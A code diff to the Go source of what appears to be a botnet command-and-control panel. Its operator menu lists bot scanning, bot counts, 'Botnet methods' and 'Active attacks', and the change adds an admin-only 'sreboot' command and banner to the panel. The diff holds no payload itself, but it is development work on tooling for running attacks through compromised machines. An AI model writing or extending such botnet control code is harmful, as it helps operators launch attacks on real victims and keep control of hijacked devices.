@@ -180,6 +180,7 @@ func CommandManager(conn net.Conn) {
 			conn.Write([]byte(color.HiWhiteString("scanner\t\t| Scan your bots\n\r")))
 			conn.Write([]byte(color.HiWhiteString("bots\t\t| Bots count\n\r")))
 			conn.Write([]byte(color.HiWhiteString("adduser\t\t| Add user\n\r")))
+			conn.Write([]byte(color.HiWhiteString("sreboot\t\t| Reboot\n\r")))
 			conn.Write([]byte(color.HiWhiteString("methods\t\t| Botnet methods\n\r")))
 			conn.Write([]byte(color.HiWhiteString("running\t\t| Active attacks\n\r")))
 
@@ -229,6 +230,16 @@ func CommandManager(conn net.Conn) {
 
 		conn.Write([]byte("Success\n"))
 
+	} else if strings.HasPrefix(string(line), "sreboot") {
+
+		if s.Login != config.GetConfig().Cnc.AdmLogin {
+			Print(gradient.Rainbow().Apply("Unknown command\n"), conn)
+			CommandManager(conn)
+		} else {
+
+			Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
+			go server.Reboot()
+		}
 	} else if strings.HasPrefix(string(line), "bots") {
 		if s.Login != config.GetConfig().Cnc.AdmLogin {
 			Print(gradient.Rainbow().Apply("Unknown command\n"), conn)
